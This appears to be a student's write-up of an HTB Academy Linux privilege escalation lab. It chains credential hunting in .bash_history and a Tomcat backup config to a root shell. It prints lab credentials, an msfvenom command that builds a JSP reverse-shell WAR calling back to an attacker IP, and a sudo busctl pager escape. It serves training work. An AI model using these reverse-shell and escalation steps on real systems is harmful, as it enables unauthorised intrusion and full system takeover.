# Linux Privilege Escalation — Skills Assessment

> **HTB Academy — CPTS Pathway | Module 25**
> Completed: May 2026

---

## Assessment Metadata

| Field | Details |
|---|---|
| **Platform** | HTB Academy |
| **Module** | Linux Privilege Escalation (Module 25) |
| **Type** | Skills Assessment Lab |
| **Host** | `nix03` — Ubuntu 20.04.1 LTS (Linux 5.4.0-45-generic x86_64) |
| **Entry Credentials** | `htb-student:Academy_LLPE!` |
| **Entry Method** | SSH |
| **Flags** | 5 |
| **Completed** | May 2026 |

---

## Attack Chain Summary

| Step | Technique | User Gained |
|---|---|---|
| 1 | Hidden file enumeration in home directory | `htb-student` |
| 2 | Credential exposure in `.bash_history` | `barry` |
| 3 | `adm` group membership — read `/var/log/` | `barry` |
| 4 | Tomcat credential in backup config → WAR reverse shell | `tomcat` |
| 5 | `sudo busctl` GTFOBins escape | `root` |

---

## Flag 1 — Hidden File Enumeration

### Goal

Enumerate the home directory thoroughly, including hidden files and directories.

### Enumeration

```bash
htb-student@nix03:~$ ls -lA
```

```
total 24
-rw------- 1 htb-student htb-student   57 Sep  6  2020 .bash_history
-rw-r--r-- 1 htb-student htb-student  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 htb-student htb-student 3771 Feb 25  2020 .bashrc
drwx------ 2 htb-student htb-student 4096 Sep  6  2020 .cache
drwxr-xr-x 2 root        root        4096 Sep  6  2020 .config
-rw-r--r-- 1 htb-student htb-student  807 Feb 25  2020 .profile
```

The `.config` directory is owned by `root` but world-readable (`drwxr-xr-x`). Enumerate its contents:

```bash
htb-student@nix03:~$ ls -lA .config/
```

```
total 4
-rw-r--r-- 1 htb-student www-data 33 Sep  6  2020 .flag1.txt
```

A hidden flag file exists inside. Read it:

```bash
htb-student@nix03:~$ cat .config/.flag1.txt
```

```
LLPE{...flag_redacted...}
```

### Flag 1 Breakdown

| Field | Value |
|---|---|
| **Location** | `~/.config/.flag1.txt` |
| **Technique** | Hidden file/directory enumeration (`ls -lA`) |
| **Why it worked** | Directory was world-readable despite root ownership |

### Analysis

The `.config` directory had permissive world-read permissions (`drwxr-xr-x`), allowing any user to list and read its contents. The flag was stored inside a hidden file (`.flag1.txt`). This demonstrates the importance of always running `ls -lA` on landing — standard `ls` would have missed this entirely.

---

## Flag 2 — Credential Exposure in bash_history

### Goal

Escalate from `htb-student` to `barry` by hunting credentials in user history files.

### Enumeration

Check readable shell history files across home directories:

```bash
htb-student@nix03:~$ cat /home/barry/.bash_history
```

```
cd /home/barry
ls
id
ssh-keygen
mysql -u root -p
tmux new -s barry
cd ~
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
<SNIP>
```

The history file reveals a plaintext password: `i_l0ve_s3cur1ty!` — used with `sshpass` in a prior SSH command. Reuse it locally:

```bash
htb-student@nix03:~$ su barry
Password: i_l0ve_s3cur1ty!

barry@nix03:/home/htb-student$ cat /home/barry/flag2.txt
```

```
LLPE{...flag_redacted...}
```

### Flag 2 Breakdown

| Field | Value |
|---|---|
| **Location** | `/home/barry/flag2.txt` |
| **Credential found** | `barry:i_l0ve_s3cur1ty!` from `/home/barry/.bash_history` |
| **Technique** | Shell history credential hunting |
| **Why it worked** | `.bash_history` was world-readable; plaintext password in a `sshpass` command |

### Analysis

The `sshpass` utility accepts passwords as command-line arguments, which means they get written verbatim into `.bash_history`. This is a common operational security failure — credentials passed via `-p` flags appear in process listings (`ps aux`) and history files. The password was directly reusable for local `su` access.

---

## Flag 3 — Group Membership — adm Read Access

### Goal

Use `barry`'s group membership to access a restricted log directory and retrieve a flag.

### Enumeration

```bash
barry@nix03:/home/htb-student$ id
```

```
uid=1001(barry) gid=1001(barry) groups=1001(barry),4(adm)
```

`barry` is a member of the `adm` group. On Debian/Ubuntu systems, the `adm` group has read access to `/var/log/`. Enumerate the directory:

```bash
barry@nix03:/home/htb-student$ ls -la /var/log/ | grep flag
```

```
-rw-r--r-- 1 root adm 33 Sep  6  2020 flag3.txt
```

```bash
barry@nix03:/home/htb-student$ cat /var/log/flag3.txt
```

```
LLPE{...flag_redacted...}
```

### Flag 3 Breakdown

| Field | Value |
|---|---|
| **Location** | `/var/log/flag3.txt` |
| **Technique** | `adm` group membership → read `/var/log/` |
| **Why it worked** | File owned by `root:adm` with group-read permissions; `barry` is in `adm` |

### Analysis

On Ubuntu, the `adm` group is intended for system monitoring — it grants read access to most log files under `/var/log/`. Membership is often overlooked during privilege escalation enumeration. Always run `id` immediately and cross-reference every group against system directories and files. The `adm` group can also expose sensitive application logs containing credentials.

---

## Flag 4 — Tomcat Credential in Backup Config → WAR Reverse Shell

### Goal

Escalate to the `tomcat` service account by discovering credentials in a backup configuration file and deploying a malicious WAR application.

### Step 1 — Discover Internal Services

Enumerate listening ports as `barry`:

```bash
barry@nix03:/home/htb-student$ netstat -tulpn | grep LISTEN
```

```
(No info could be read for "-p": geteuid()=1001 but you should be root.)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::8080                 :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::33060                :::*                    LISTEN      -
```

Port `8080` is open — Apache Tomcat is running and externally accessible. The Tomcat Manager application is available at `http://10.129.91.85:8080/manager/html`.

### Step 2 — Hunt Tomcat Credentials

Tomcat stores credentials in XML configuration files. Search for backup or non-standard configs:

```bash
barry@nix03:/home/htb-student$ ls -la /etc/tomcat9/
```

```
total 48
drwxr-xr-x  3 root   root    4096 Oct  8  2020 .
drwxr-xr-x 96 root   root    4096 Oct  8  2020 ..
-rw-r--r--  1 root   tomcat  1394 Jul  3  2020 context.xml
-rw-r--r--  1 root   tomcat  1149 Jul  3  2020 jvm.options
-rw-r--r--  1 root   tomcat  2513 Jul  3  2020 logging.properties
-rw-r-----  1 root   tomcat  2211 Jul  3  2020 server.xml
-rw-r--r--  1 root   tomcat  2972 Sep  6  2020 tomcat-users.xml
-rw-r--r--  1 barry  barry   2972 Sep  6  2020 tomcat-users.xml.bak
-rw-r--r--  1 root   root    3498 Jul  3  2020 web.xml
drwxr-xr-x  2 root   root    4096 Oct  8  2020 Catalina
```

A backup file `tomcat-users.xml.bak` is owned by `barry:barry` with world-read permissions. Extract credentials:

```bash
barry@nix03:/home/htb-student$ cat /etc/tomcat9/tomcat-users.xml.bak | grep "password"
```

```
  you must define such a user - the username and password are arbitrary. It is
  them. You will also need to set the passwords to something appropriate.
 <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
```

Credentials: `tomcatadm:T0mc@t_s3cret_p@ss!` — full manager-gui and admin roles.

### Step 3 — Generate Malicious WAR Payload

On the attack host, start an `nc` listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -nvlp 9001
```

Generate a reverse shell WAR file using `msfvenom`:

```bash
Hackerpatel007_1@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.43 LPORT=9001 -f war -o managerUpdated.war
```

```
Payload size: 1103 bytes
Final size of war file: 1103 bytes
Saved as: managerUpdated.war
```

### Step 4 — Deploy via Tomcat Manager

1. Navigate to `http://10.129.91.85:8080/manager/html`
2. Authenticate with `tomcatadm:T0mc@t_s3cret_p@ss!`
3. Scroll to the **WAR file to deploy** section
4. Upload `managerUpdated.war` and click **Deploy**
5. Click the deployed application path in the application list to trigger execution

Reverse shell received:

```
Ncat: Connection from 10.129.91.85.
Ncat: Connection from 10.129.91.85:55938.

whoami
tomcat
```

### Step 5 — Read Flag 4

```bash
cat /var/lib/tomcat9/flag4.txt
```

```
LLPE{...flag_redacted...}
```

### Flag 4 Breakdown

| Field | Value |
|---|---|
| **Location** | `/var/lib/tomcat9/flag4.txt` |
| **Credential source** | `/etc/tomcat9/tomcat-users.xml.bak` (world-readable backup) |
| **Technique** | Service credential hunting → Tomcat Manager WAR deployment → JSP reverse shell |
| **Payload** | `java/jsp_shell_reverse_tcp` via `msfvenom` |
| **Why it worked** | Backup config file left world-readable with plaintext credentials; Tomcat Manager allowed arbitrary WAR deployment |

### Analysis

Backup configuration files (`.bak`, `.old`, `.orig`) are a frequent source of credential exposure. The production `tomcat-users.xml` had tighter permissions (`root:tomcat`), but the backup was carelessly left as `barry:barry` with world-read. Once the Tomcat Manager is accessible with valid credentials, deploying a reverse shell WAR is trivial — this is a well-known, highly reliable code execution path against Tomcat instances.

---

## Flag 5 — sudo busctl GTFOBins Escape → Root

### Goal

Escalate from `tomcat` to `root` using a misconfigured sudo entry.

### Step 1 — Check Sudo Permissions

Upgrade to a PTY first (required for interactive `less`-based pagers):

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Check sudo rights:

```bash
tomcat@nix03:/var/lib/tomcat9$ sudo -l
```

```
Matching Defaults entries for tomcat on nix03:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User tomcat may run the following commands on nix03:
    (root) NOPASSWD: /usr/bin/busctl
```

`tomcat` can run `/usr/bin/busctl` as root without a password. `busctl` is the D-Bus control tool — it opens an interactive pager (`less`) to display output.

### Step 2 — GTFOBins Escape via busctl

`busctl` passes output through `less`. From within `less`, any `!command` executes as the shell's effective user — in this case, root.

```bash
tomcat@nix03:/var/lib/tomcat9$ sudo busctl --show-machine
```

When the pager opens:

```
!/bin/bash
```

```
root@nix03:/var/lib/tomcat9# id
uid=0(root) gid=0(root) groups=0(root)
```

### Step 3 — Read Flag 5

```bash
root@nix03:/var/lib/tomcat9# cat /root/flag5.txt
```

```
LLPE{...flag_redacted...}
```

### Flag 5 Breakdown

| Field | Value |
|---|---|
| **Location** | `/root/flag5.txt` |
| **Technique** | `sudo busctl` → `less` pager shell escape |
| **GTFOBins reference** | [https://gtfobins.github.io/gtfobins/busctl/](https://gtfobins.github.io/gtfobins/busctl/) |
| **Why it worked** | `busctl` invokes `less` as pager; `less` allows `!command` shell execution; running as root via sudo = instant root shell |

### Analysis

Any binary that invokes a pager (`less`, `more`, `man`) as part of its normal operation is a potential sudo escape vector — even if the binary itself seems harmless. `busctl` is a system administration tool with no obvious shell-escape reputation, making it easy to miss in a manual sudo review. The `--show-machine` flag forces pager output, which is the trigger. GTFOBins documents this class of escape for dozens of binaries.

---

## Full Attack Chain Reference

```
[Entry] SSH htb-student:Academy_LLPE! → 10.129.91.85
    │
    ├─[1] ls -lA → .config/.flag1.txt (hidden file enumeration)
    │
    ├─[2] cat /home/barry/.bash_history → password i_l0ve_s3cur1ty!
    │       └─ su barry → flag2.txt
    │
    ├─[3] id → groups=adm → cat /var/log/flag3.txt
    │
    ├─[4] netstat → port 8080 (Tomcat)
    │       └─ cat /etc/tomcat9/tomcat-users.xml.bak → tomcatadm:T0mc@t_s3cret_p@ss!
    │               └─ Tomcat Manager WAR upload → JSP reverse shell → tomcat user
    │                       └─ cat /var/lib/tomcat9/flag4.txt
    │
    └─[5] sudo -l → /usr/bin/busctl NOPASSWD
            └─ sudo busctl --show-machine → !/bin/bash → root
                    └─ cat /root/flag5.txt
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `ssh htb-student@10.129.91.85` | Initial entry |
| `ls -lA` | List all files including hidden, with details |
| `cat /home/barry/.bash_history` | Credential hunting in shell history |
| `su barry` | Switch to barry using discovered password |
| `id` | Enumerate group memberships |
| `cat /var/log/flag3.txt` | Read flag via adm group read access |
| `netstat -tulpn \| grep LISTEN` | Discover internal and external listening services |
| `cat /etc/tomcat9/tomcat-users.xml.bak` | Extract Tomcat credentials from backup config |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.43 LPORT=9001 -f war` | Generate reverse shell WAR payload |
| `nc -nvlp 9001` | Catch reverse shell on attack host |
| `python3 -c 'import pty;pty.spawn("/bin/bash")'` | Upgrade to PTY for interactive pager |
| `sudo -l` | Enumerate sudo permissions |
| `sudo busctl --show-machine` | Trigger busctl pager (less) as root |
| `!/bin/bash` | Shell escape from within less |
| `cat /root/flag5.txt` | Read final flag as root |

---

## Lessons Learned

**1. Always enumerate hidden files on landing.**
`ls -lA` is mandatory on every new shell. Hidden directories with permissive ownership are easily missed with standard `ls`.

**2. Shell history is a goldmine.**
`sshpass -p` and similar patterns are a direct credential leak. Always check `~/.bash_history`, `~/.zsh_history`, and other users' history files if readable.

**3. Group membership controls more access than it appears.**
The `adm` group grants system-log read access across the entire `/var/log/` tree on Ubuntu — not just a specific file. Know what each non-standard group grants.

**4. Backup files are not backups of security.**
`.bak` files are often left with relaxed permissions and forgotten. Any service configuration directory should be enumerated for backup files alongside the live config.

**5. WAR deployment = RCE when Tomcat Manager is accessible.**
Tomcat Manager with valid credentials is game over. There is no equivalent of "limited access" — manager-gui role allows arbitrary application deployment and therefore arbitrary code execution.

**6. GTFOBins covers binaries that don't look dangerous.**
`busctl` is a D-Bus tool. Its shell escape potential is non-obvious. When `sudo -l` shows any binary, the GTFOBins lookup is mandatory — regardless of how innocuous the binary appears.

---

## References

- [GTFOBins — busctl](https://gtfobins.github.io/gtfobins/busctl/)
- [Apache Tomcat Manager WAR Deployment](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html)
- [HTB Academy — Linux Privilege Escalation](https://academy.hackthebox.com/module/details/51)

---

*Skills Assessment — HTB Academy Linux Privilege Escalation (Module 25). Completed May 2026. All flags redacted per HTB content policy.*
